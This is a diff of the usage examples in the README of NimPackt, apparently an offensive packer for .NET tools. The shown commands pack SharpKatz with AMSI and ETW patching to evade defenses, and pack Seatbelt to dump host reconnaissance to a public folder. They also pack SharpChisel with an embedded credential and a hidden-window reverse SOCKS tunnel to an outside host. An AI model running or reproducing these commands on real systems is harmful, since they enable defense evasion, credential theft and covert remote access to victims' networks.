@@ -86,6 +86,9 @@ other arguments:
 # Pack SharpKatz to accept commands at runtime, patching hooks, AMSI, and ETW while printing verbose messages on runtime
 python3 ./NimPackt.py -e execute-assembly -i bins/SharpKatz-x64.exe -v
 
+# Pack Seatbelt as a DLL file with baked-in arguments (note: write to outfile because stdout is not available for execute-assembly DLLs)
+python3 ./NimPackt.py -f dll -e execute-assembly -i Seatbelt.exe -a "-group=all -outputfile=c:\users\public\downloads\sb.txt"
+
 # Pack SharpChisel with a built-in ChiselChief connection string, do not patch AMSI or disable ETW, hide the application window on runtime
 python3 NimPackt.py -na -ne -H -e execute-assembly -i bins/SharpChisel.exe -a 'client --auth nimpackt.demo_A:718nubCpwiuLUW --keepalive 25s --max-retry-interval 25s https://chisel.azurewebsites.net R:10073:socks'
 
